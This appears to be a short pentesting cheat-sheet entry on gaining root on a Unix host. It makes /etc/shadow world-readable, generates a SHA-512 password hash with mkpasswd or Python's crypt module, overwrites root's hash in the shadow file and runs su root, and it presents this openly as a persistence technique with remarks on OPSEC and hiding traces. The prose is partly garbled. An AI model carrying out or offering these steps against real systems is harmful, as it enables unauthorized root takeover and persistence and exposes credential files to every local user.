# Unix Shell

Nowadays most modern Linux servers and desktops currently are most up-to-date and I can say you'll rarely find it or not. Yet you can use this method as a persistence technique yet it's not OPSEC safe to do so but hey you'll might need it under certain circumstances.

- Backup the shadow file. To clear traces ahead of time.

`$ cp /etc/shadow /tmp/shadow.bak && sudo chmod o+r /etc/shadow`

## Exploit

### Overwrite Password via Hash Digest

#### Mkpasswd

`$ mkpasswd -m sha-512 newpass1234`

#### Python Crypt Module

`$ python -c 'import crypt; print(crypt.crypt("newpass1234", "$6$salt"))'`

Then edit the shadow file `root:<sha512crypt_hash>:17298:0:99999:7:::` replace the old `<sha512crypt_hash>` which starts with $6$ into a new one that was previously generated.

Then try to authenticate and you're root.

`$ su root`
